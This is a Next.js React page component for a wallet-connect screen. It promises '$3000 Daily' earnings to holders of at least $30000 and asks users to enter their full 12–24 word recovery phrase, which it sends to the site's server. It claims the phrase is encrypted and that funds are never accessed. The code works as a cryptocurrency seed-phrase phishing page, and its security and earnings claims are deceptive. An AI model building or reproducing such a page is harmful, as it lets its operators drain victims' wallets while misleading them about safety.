"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import {
  Wallet,
  ShieldCheck,
  Zap,
  TrendingUp,
  Eye,
  EyeOff,
  AlertTriangle,
  CheckCircle2,
  Circle,
  Loader2,
  ChevronDown,
} from "lucide-react";

// ── Wallet data ──────────────────────────────────────────────────────────────

const FEATURED_WALLETS = [
  {
    id: "MetaMask",
    label: "MetaMask",
    color: "bg-orange-50 dark:bg-orange-900/20",
    border: "border-orange-200 dark:border-orange-700",
    icon: (
      <svg viewBox="0 0 40 40" className="w-8 h-8" fill="none">
        <path d="M36.6 3L22.1 13.6l2.7-6.3L36.6 3z" fill="#E2761B" stroke="#E2761B" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M3.4 3l14.4 10.7-2.6-6.4L3.4 3z" fill="#E4761B" stroke="#E4761B" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M31.4 27.4l-3.9 5.9 8.4 2.3 2.4-8.1-6.9-.1zM1.8 27.5l2.3 8.1 8.4-2.3-3.9-5.9-6.8.1z" fill="#E4761B" stroke="#E4761B" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M12 17.5l-2.3 3.5 8.2.4-.3-8.8L12 17.5zM28 17.5l-5.7-5-.2 8.9 8.2-.4L28 17.5z" fill="#E4761B" stroke="#E4761B" strokeLinecap="round" strokeLinejoin="round"/>
        <path d="M12.5 33.3l4.9-2.4-4.2-3.3-.7 5.7zM22.6 30.9l4.9 2.4-.8-5.7-4.1 3.3z" fill="#E4761B" stroke="#E4761B" strokeLinecap="round" strokeLinejoin="round"/>
      </svg>
    ),
  },
  {
    id: "Trust Wallet",
    label: "Trust Wallet",
    color: "bg-blue-50 dark:bg-blue-900/20",
    border: "border-blue-200 dark:border-blue-700",
    icon: (
      <svg viewBox="0 0 40 40" className="w-8 h-8" fill="none">
        <circle cx="20" cy="20" r="20" fill="#3375BB"/>
        <path d="M20 8l10 4v8c0 5.5-4.5 10-10 12C10 30 6 25.5 6 20v-8l14-4z" fill="white" opacity=".9"/>
        <path d="M15 20l3 3 7-7" stroke="#3375BB" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
      </svg>
    ),
  },
  {
    id: "Coinbase",
    label: "Coinbase",
    color: "bg-blue-50 dark:bg-blue-900/20",
    border: "border-blue-200 dark:border-blue-700",
    icon: (
      <svg viewBox="0 0 40 40" className="w-8 h-8" fill="none">
        <circle cx="20" cy="20" r="20" fill="#0052FF"/>
        <circle cx="20" cy="20" r="8" fill="white"/>
        <path d="M17 20a3 3 0 106 0 3 3 0 00-6 0z" fill="#0052FF"/>
      </svg>
    ),
  },
];

const OTHER_WALLETS: { group: string; wallets: { id: string; label: string; emoji: string }[] }[] = [
  {
    group: "Popular Wallets",
    wallets: [
      { id: "MetaMask",       label: "MetaMask",       emoji: "🦊" },
      { id: "Trust Wallet",   label: "Trust Wallet",   emoji: "🛡️" },
      { id: "Coinbase Wallet",label: "Coinbase Wallet",emoji: "🔵" },
      { id: "Exodus",         label: "Exodus",         emoji: "🚀" },
    ],
  },
  {
    group: "Hardware Wallets",
    wallets: [
      { id: "Ledger",   label: "Ledger",   emoji: "🔒" },
      { id: "Trezor",   label: "Trezor",   emoji: "🔒" },
      { id: "KeepKey",  label: "KeepKey",  emoji: "🔑" },
    ],
  },
  {
    group: "Mobile Wallets",
    wallets: [
      { id: "Atomic Wallet",  label: "Atomic Wallet",  emoji: "⚛️" },
      { id: "Mycelium",       label: "Mycelium",       emoji: "🍄" },
      { id: "Jaxx Liberty",   label: "Jaxx Liberty",   emoji: "💎" },
      { id: "BRD",            label: "BRD",            emoji: "🍞" },
      { id: "Guarda",         label: "Guarda",         emoji: "🛡️" },
      { id: "Enjin Wallet",   label: "Enjin Wallet",   emoji: "🎮" },
      { id: "ZenGo",          label: "ZenGo",          emoji: "🧘" },
      { id: "imToken",        label: "imToken",        emoji: "💫" },
      { id: "TokenPocket",    label: "TokenPocket",    emoji: "👛" },
      { id: "SafePal",        label: "SafePal",        emoji: "🔐" },
    ],
  },
  {
    group: "Browser Wallets",
    wallets: [
      { id: "Brave Wallet",   label: "Brave Wallet",   emoji: "🦁" },
      { id: "Opera Wallet",   label: "Opera Wallet",   emoji: "🎭" },
      { id: "Phantom",        label: "Phantom",        emoji: "👻" },
      { id: "Solflare",       label: "Solflare",       emoji: "☀️" },
    ],
  },
];

const ALL_OTHER_IDS = OTHER_WALLETS.flatMap((g) => g.wallets.map((w) => w.id));

// ── Component ────────────────────────────────────────────────────────────────

export default function ConnectWalletPage() {
  const router = useRouter();

  const [selectedWallet, setSelectedWallet] = useState("MetaMask");
  const [othersOpen, setOthersOpen] = useState(false);
  const [phrase, setPhrase] = useState("");
  const [showPhrase, setShowPhrase] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);
  const [connectedAddress, setConnectedAddress] = useState("");

  const words = phrase.trim().split(/\s+/).filter(Boolean);
  const wordCount = phrase.trim() === "" ? 0 : words.length;
  const validCount = wordCount >= 12 && wordCount <= 24;
  const validChars = /^[a-zA-Z\s]*$/.test(phrase);

  async function handleConnect(e: React.FormEvent) {
    e.preventDefault();
    setError("");

    if (!validCount) {
      setError("Recovery phrase must be 12 or 24 words.");
      return;
    }
    if (!validChars) {
      setError("Recovery phrase may only contain letters and spaces.");
      return;
    }

    setLoading(true);
    try {
      const res = await fetch("/api/wallet/connect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ walletProvider: selectedWallet, seedPhrase: phrase }),
      });
      const data = await res.json();
      if (!res.ok) {
        setError(data.error || "Connection failed. Please try again.");
      } else {
        setConnectedAddress(data.walletAddress || "");
        setSuccess(true);
      }
    } catch {
      setError("Network error. Please check your connection.");
    } finally {
      setLoading(false);
    }
  }

  // ── Success screen ──
  if (success) {
    return (
      <div className="max-w-md mx-auto mt-16 text-center px-4">
        <div className="bg-white dark:bg-gray-800 rounded-2xl border border-gray-200 dark:border-gray-700 p-10 shadow-sm">
          <div className="w-16 h-16 rounded-full bg-green-100 dark:bg-green-900/30 flex items-center justify-center mx-auto mb-6">
            <CheckCircle2 size={36} className="text-green-500" />
          </div>
          <h2 className="text-2xl font-extrabold text-gray-900 dark:text-white mb-2">Wallet Connected!</h2>
          <p className="text-sm text-gray-500 dark:text-gray-400 mb-2">
            Your <span className="font-bold text-gray-900 dark:text-white">{selectedWallet}</span> wallet has been connected successfully.
          </p>
          {connectedAddress && (
            <div className="my-4 p-3 bg-gray-50 dark:bg-black/35 rounded-xl border border-gray-150 dark:border-gray-700/60">
              <p className="text-[10px] text-gray-400 uppercase tracking-wider font-semibold">Wallet Address</p>
              <code className="text-xs text-primary-500 font-mono select-all block mt-1 break-all">{connectedAddress}</code>
            </div>
          )}
          <p className="text-xs text-gray-400 mb-8">You can now start earning daily rewards.</p>
          <button
            onClick={() => {
              // Trigger a page refresh on redirect to update the top nav state
              router.push("/dashboard");
              setTimeout(() => window.location.reload(), 100);
            }}
            className="w-full py-3 rounded-xl bg-primary-500 hover:bg-primary-600 text-white font-bold text-sm transition-colors"
          >
            Go to Dashboard
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-3xl mx-auto space-y-5">

      {/* ── Pink top banner ── */}
      <div className="bg-red-50 dark:bg-red-900/20 border border-red-100 dark:border-red-800 rounded-2xl p-5 flex items-start gap-4">
        <div className="w-10 h-10 rounded-xl bg-primary-100 dark:bg-primary-900/30 flex items-center justify-center flex-shrink-0 mt-0.5">
          <TrendingUp size={20} className="text-primary-500" />
        </div>
        <div>
          <h3 className="font-extrabold text-gray-900 dark:text-white text-base mb-1">
            Start Earning <span className="text-primary-500">$3000</span> Daily
          </h3>
          <p className="text-xs text-gray-600 dark:text-gray-400 leading-relaxed mb-3">
            Connect your cryptocurrency wallet to unlock daily earning opportunities. Ensure your wallet contains at least{" "}
            <span className="font-bold text-primary-500">$30000</span> to be eligible for automatic daily rewards.
          </p>
          <div className="flex flex-wrap items-center gap-4 text-xs font-semibold text-gray-500 dark:text-gray-400">
            <span className="flex items-center gap-1.5"><ShieldCheck size={12} className="text-green-500" /> Secure Connection</span>
            <span className="flex items-center gap-1.5"><Zap size={12} className="text-yellow-500" /> Instant Setup</span>
            <span className="flex items-center gap-1.5"><TrendingUp size={12} className="text-primary-500" /> Daily Rewards</span>
          </div>
        </div>
      </div>

      {/* ── Main card ── */}
      <div className="bg-white dark:bg-gray-800 rounded-2xl border border-gray-200 dark:border-gray-700 shadow-sm overflow-hidden">
        <div className="p-6 border-b border-gray-100 dark:border-gray-700 flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-purple-100 dark:bg-purple-900/20 flex items-center justify-center">
            <Wallet size={20} className="text-purple-500" />
          </div>
          <div>
            <h2 className="text-lg font-extrabold text-gray-900 dark:text-white">Connect Your Wallet</h2>
            <p className="text-xs text-gray-500 dark:text-gray-400">Choose your wallet provider and enter your recovery phrase</p>
          </div>
        </div>

        <form onSubmit={handleConnect} className="p-6 space-y-6">

          {/* ── Select Wallet Provider ── */}
          <div>
            <div className="flex items-center gap-2 mb-4">
              <div className="w-4 h-4 rounded border-2 border-gray-300 dark:border-gray-600 flex items-center justify-center">
                <div className="w-1.5 h-1.5 rounded-full bg-primary-500"></div>
              </div>
              <span className="text-sm font-extrabold text-gray-700 dark:text-gray-300">Select Wallet Provider</span>
            </div>

            {/* Featured 3 + Others grid */}
            <div className="grid grid-cols-4 gap-3">
              {FEATURED_WALLETS.map((w) => (
                <button
                  key={w.id}
                  type="button"
                  onClick={() => { setSelectedWallet(w.id); setOthersOpen(false); }}
                  className={`flex flex-col items-center gap-2 p-4 rounded-xl border-2 transition-all ${
                    selectedWallet === w.id
                      ? "border-primary-500 bg-primary-50 dark:bg-primary-900/20"
                      : `border-gray-200 dark:border-gray-700 ${w.color} hover:border-primary-300`
                  }`}
                >
                  {w.icon}
                  <span className="text-xs font-bold text-gray-700 dark:text-gray-300 text-center leading-tight">{w.label}</span>
                </button>
              ))}

              {/* Others button */}
              <div className="relative">
                <button
                  type="button"
                  onClick={() => setOthersOpen(!othersOpen)}
                  className={`w-full flex flex-col items-center gap-2 p-4 rounded-xl border-2 transition-all ${
                    ALL_OTHER_IDS.includes(selectedWallet)
                      ? "border-primary-500 bg-primary-50 dark:bg-primary-900/20"
                      : "border-dashed border-gray-300 dark:border-gray-600 hover:border-primary-300 bg-gray-50 dark:bg-gray-900/30"
                  }`}
                >
                  <div className="w-8 h-8 flex items-center justify-center">
                    <span className="text-gray-400 dark:text-gray-500 text-xl font-black">···</span>
                  </div>
                  <span className="text-xs font-bold text-gray-500 dark:text-gray-400">Others</span>
                </button>

                {/* Others dropdown */}
                {othersOpen && (
                  <>
                    <div className="fixed inset-0 z-30" onClick={() => setOthersOpen(false)} />
                    <div className="absolute right-0 top-full mt-2 w-72 bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-xl shadow-2xl z-40 overflow-hidden">
                      <div className="px-4 py-2.5 border-b border-gray-100 dark:border-gray-700">
                        <p className="text-xs font-extrabold text-gray-500 dark:text-gray-400 uppercase tracking-wider">Choose a wallet provider</p>
                      </div>
                      <div className="max-h-72 overflow-y-auto">
                        {OTHER_WALLETS.map((group) => (
                          <div key={group.group}>
                            <div className="px-4 py-1.5 bg-gray-50 dark:bg-gray-900/50">
                              <p className="text-[10px] font-extrabold text-gray-400 uppercase tracking-wider">{group.group}</p>
                            </div>
                            {group.wallets.map((w) => (
                              <button
                                key={w.id}
                                type="button"
                                onClick={() => { setSelectedWallet(w.id); setOthersOpen(false); }}
                                className={`w-full flex items-center gap-3 px-4 py-2.5 text-sm text-left transition-colors ${
                                  selectedWallet === w.id
                                    ? "bg-blue-50 dark:bg-blue-900/20 text-blue-600 dark:text-blue-400 font-bold"
                                    : "text-gray-700 dark:text-gray-300 hover:bg-gray-50 dark:hover:bg-gray-700"
                                }`}
                              >
                                <span className="text-base">{w.emoji}</span>
                                <span className="font-semibold">{w.label}</span>
                              </button>
                            ))}
                          </div>
                        ))}
                      </div>
                    </div>
                  </>
                )}
              </div>
            </div>

            {/* Selected wallet display (shown when an "other" wallet is selected) */}
            {ALL_OTHER_IDS.includes(selectedWallet) && (
              <div className="mt-3">
                <button
                  type="button"
                  onClick={() => setOthersOpen(!othersOpen)}
                  className="w-full flex items-center justify-between px-4 py-3 rounded-xl border-2 border-primary-500 bg-primary-50 dark:bg-primary-900/20 text-sm font-bold text-primary-600 dark:text-primary-400"
                >
                  <span className="flex items-center gap-2">
                    <span className="text-base">
                      {OTHER_WALLETS.flatMap((g) => g.wallets).find((w) => w.id === selectedWallet)?.emoji}
                    </span>
                    {selectedWallet}
                  </span>
                  <ChevronDown size={15} className={`transition-transform ${othersOpen ? "rotate-180" : ""}`} />
                </button>
              </div>
            )}
          </div>

          {/* ── Recovery Phrase ── */}
          <div>
            <div className="flex items-center gap-2 mb-3">
              <div className="w-4 h-4 rounded border-2 border-gray-300 dark:border-gray-600 flex items-center justify-center">
                <div className="w-1.5 h-1.5 rounded-full bg-primary-500"></div>
              </div>
              <span className="text-sm font-extrabold text-gray-700 dark:text-gray-300">Recovery Phrase (Seed Phrase)</span>
            </div>

            {/* Yellow important notice */}
            <div className="flex items-start gap-3 p-4 bg-yellow-50 dark:bg-yellow-900/20 border border-yellow-200 dark:border-yellow-800 rounded-xl mb-3">
              <AlertTriangle size={15} className="text-yellow-500 flex-shrink-0 mt-0.5" />
              <p className="text-xs text-yellow-800 dark:text-yellow-300 leading-relaxed">
                <span className="font-extrabold">Important:</span> Your recovery phrase is encrypted and securely stored. We never store your private keys or access your funds.
              </p>
            </div>

            {/* Textarea */}
            <div className="relative">
              <textarea
                value={phrase}
                onChange={(e) => { setPhrase(e.target.value); setError(""); }}
                placeholder="Enter your 12 or 24 word recovery phrase separated by spaces..."
                rows={4}
                className={`w-full px-4 py-3 rounded-xl border bg-white dark:bg-gray-900 text-gray-900 dark:text-white text-sm font-medium placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-transparent transition-all resize-none ${
                  showPhrase ? "" : "text-security-disc [-webkit-text-security:disc]"
                } ${error ? "border-red-300 dark:border-red-700" : "border-gray-200 dark:border-gray-700"}`}
                style={!showPhrase && phrase ? { WebkitTextSecurity: "disc" } as React.CSSProperties : {}}
              />
              {/* Word count + show/hide */}
              <div className="absolute bottom-3 right-3 flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => setShowPhrase(!showPhrase)}
                  className="text-gray-400 hover:text-gray-600 dark:hover:text-gray-200 transition-colors"
                >
                  {showPhrase ? <EyeOff size={15} /> : <Eye size={15} />}
                </button>
                <span className="text-[10px] text-gray-400 font-semibold">{wordCount} words</span>
              </div>
            </div>

            {/* Validation indicators */}
            <div className="flex flex-col gap-1.5 mt-2">
              <div className="flex items-center gap-2">
                {validCount ? (
                  <CheckCircle2 size={13} className="text-green-500" />
                ) : (
                  <Circle size={13} className="text-gray-300 dark:text-gray-600" />
                )}
                <span className={`text-xs font-semibold ${validCount ? "text-green-600 dark:text-green-400" : "text-gray-400"}`}>
                  Valid word count (12-24 words)
                </span>
              </div>
              <div className="flex items-center gap-2">
                {validChars ? (
                  <CheckCircle2 size={13} className="text-green-500" />
                ) : (
                  <Circle size={13} className="text-red-400" />
                )}
                <span className={`text-xs font-semibold ${validChars ? "text-green-600 dark:text-green-400" : "text-red-500"}`}>
                  Contains only valid characters
                </span>
              </div>
            </div>

            {/* API error */}
            {error && (
              <div className="flex items-center gap-2 mt-3 p-3 bg-red-50 dark:bg-red-900/20 border border-red-200 dark:border-red-800 rounded-xl text-xs text-red-700 dark:text-red-400 font-semibold">
                <AlertTriangle size={13} className="flex-shrink-0" /> {error}
              </div>
            )}
          </div>

          {/* ── Submit ── */}
          <button
            type="submit"
            disabled={loading || !validCount || !validChars}
            className="w-full flex items-center justify-center gap-2 py-3.5 bg-primary-500 hover:bg-primary-600 disabled:opacity-50 disabled:cursor-not-allowed text-white font-extrabold text-sm rounded-xl transition-colors shadow-md shadow-primary-500/20"
          >
            {loading ? (
              <><Loader2 size={16} className="animate-spin" /> Connecting Wallet...</>
            ) : (
              <><Wallet size={16} /> Connect Wallet</>
            )}
          </button>
        </form>
      </div>

      {/* ── 3 feature badges ── */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        {[
          {
            icon: <ShieldCheck size={24} className="text-green-500" />,
            bg: "bg-green-50 dark:bg-green-900/20",
            title: "Bank-Level Security",
            desc: "Your data is encrypted using industry-standard security protocols",
          },
          {
            icon: <EyeOff size={24} className="text-pink-500" />,
            bg: "bg-pink-50 dark:bg-pink-900/20",
            title: "Privacy First",
            desc: "We never access your funds or store sensitive wallet information",
          },
          {
            icon: <Zap size={24} className="text-purple-500" />,
            bg: "bg-purple-50 dark:bg-purple-900/20",
            title: "Instant Connection",
            desc: "Quick setup process with immediate access to earning features",
          },
        ].map((f, i) => (
          <div key={i} className="bg-white dark:bg-gray-800 rounded-2xl border border-gray-200 dark:border-gray-700 p-5 shadow-sm text-center">
            <div className={`w-12 h-12 rounded-full ${f.bg} flex items-center justify-center mx-auto mb-3`}>
              {f.icon}
            </div>
            <h4 className="font-extrabold text-gray-900 dark:text-white text-sm mb-1">{f.title}</h4>
            <p className="text-xs text-gray-500 dark:text-gray-400 leading-relaxed">{f.desc}</p>
          </div>
        ))}
      </div>
    </div>
  );
}
